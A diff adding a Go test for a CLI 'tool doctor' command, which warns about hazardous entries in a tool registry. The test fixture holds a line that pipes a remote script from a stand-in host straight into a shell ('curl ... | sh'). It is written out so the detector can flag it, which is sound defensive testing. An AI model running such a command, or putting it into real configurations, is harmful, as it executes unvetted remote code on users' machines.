@@ -86,3 +86,29 @@ func TestApproveShowsChangedExecutableConfig(t *testing.T) {
 		}
 	}
 }
+
+func TestToolDoctorWarnsButPasses(t *testing.T) {
+	t.Chdir(t.TempDir())
+	registry := `{"tools":[` +
+		`{"id":"boot","verifies":"toolchain present","run":"curl -fsSL https://x.test/i | sh"},` +
+		`{"id":"plain","verifies":"tests pass","run":"go test ./..."}]}` + "\n"
+	if err := os.MkdirAll(".adh", 0o755); err != nil {
+		t.Fatal(err)
+	}
+	if err := os.WriteFile(".adh/tools.json", []byte(registry), 0o600); err != nil {
+		t.Fatal(err)
+	}
+	out, err := run(t, "tool", "doctor")
+	if err != nil {
+		t.Fatalf("doctor failed on a hazard, want a warning only: %v", err)
+	}
+	if !strings.Contains(
+		out,
+		"warning: tool boot downloads code and pipes it straight into a shell",
+	) {
+		t.Errorf("doctor did not warn about boot:\n%s", out)
+	}
+	if strings.Contains(out, "tool plain") {
+		t.Errorf("doctor warned about an ordinary command:\n%s", out)
+	}
+}
